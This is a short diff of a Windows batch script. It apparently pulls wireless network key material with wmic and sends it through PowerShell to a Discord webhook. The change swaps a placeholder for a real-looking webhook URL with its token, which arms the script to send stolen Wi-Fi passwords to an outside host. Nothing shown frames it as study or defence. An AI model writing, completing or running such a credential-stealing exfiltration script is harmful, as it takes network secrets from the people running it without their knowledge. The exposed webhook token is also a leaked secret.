@@ -6,7 +6,7 @@ for /f "tokens=2 delims=:" %%A in ('wmic wirelessnetworkprofile where name="Wire
     set "KeyMaterial=%%A"
 )
 
-set "DiscordWebhookURL=YOUR_DISCORD_WEBHOOK_URL"
+set "DiscordWebhookURL=https://discord.com/api/webhooks/1347662704709472407/9ohSSgF-GCi4B_O5wmmrB0OVZXGO7D8zxEMfDxctVUpgXyI5IlNZ9c-EDgAm7hQEybra"
 
 powershell -Command "
     $payload = @{
